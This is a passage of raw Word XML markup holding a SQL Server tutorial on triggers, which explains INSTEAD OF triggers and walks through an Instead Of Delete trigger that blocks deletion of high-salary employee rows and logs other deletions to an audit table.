          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>trgAfterDelete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>on the specified table.</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w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FF9900"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ii</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FF9900"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>) Instead Of Triggers</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t xml:space="preserve">These can be used as an interceptor for anything that anyone tried to do on our table or view. If you define </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>an</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Instead</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Of</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> trigger</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>on a table for the Delete operation, they try to delete rows, and they will not actually get deleted (unless you issue another delete instruction from within the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lastRenderedPageBreak/>
        <w:t>INSTEAD OF TRIGGERS can be classified further into three types as:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>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INSTEAD OF INSERT Trigger.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>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INSTEAD OF UPDATE Trigger.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t>INSTEAD OF DELETE Trigger.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Let’s create an Instead Of Delete Trigger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CREATE</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TRIGGER</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trgInsteadOfDelete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ON</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dbo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.[</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>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INSTEAD </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-keyword"/>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>OF</w:t>
      </w:r>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DELETE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AS</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emp_id</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emp_name</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-keyword"/>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>varchar</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100</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declare</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-sdkkeyword"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="339999"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>@</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-sdkkeyword"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="339999"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>emp_sal</w:t>
      </w:r>
      <w:proofErr w:type="spell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int</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d.Emp_ID</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emp_name</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d.Emp_Name</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select</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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d.Emp_Sal</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deleted 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Style w:val="code-keyword"/>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>BEGIN</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if</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gram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emp_sal</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>&gt;1200)</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begin</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RAISERROR</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-string"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="800080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>'Cannot delete where salary &gt; 1200'</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16</w:t>
      </w:r>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1</w:t>
      </w:r>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t>ROLLBACK;</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end</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else</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begin</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delete</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from</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where</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w: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t>COMMIT;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insert</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-keyword"/>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>into</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Employee_Test_Audit(Emp_ID,Emp_Name,Emp_Sal,Audit_Action,Audit_Timestamp)</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values</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-sdkkeyword"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="339999"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>@emp_id</w:t>
      </w:r>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@emp_name</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-sdkkeyword"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="339999"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>@emp_</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-sdkkeyword"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="339999"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>sal</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-string"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="800080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>'Deleted -- Instead Of Delete Trigger.'</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>getdate</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>());</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PRINT</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-string"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="800080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>'Record Deleted -- Instead Of Delete Trigger.'</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Fonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-keyword"/>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>end</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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ab/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-keyword"/>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>END</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Style w:val="code-keyword"/>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>GO</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">This trigger will prevent the deletion of records from the table where </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Emp_Sal</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> &gt; 1200. If such a record is deleted, the Instead Of Trigger will </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>rollback</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> the transaction, otherwise the transaction will be committed. Now, let’s try to delete a record with the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Emp_Sal</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> &gt;1200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proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-keyword"/>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>delete</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Employee_Test</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> where </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Emp_ID</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-digit"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="0"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>This will print an error message as defined in the</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>RAISE ERROR</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>statement as:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="999999"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="999999"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Hide</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rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="999999"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="999999"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Copy Code</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Server: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Msg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-digit"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>50000</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
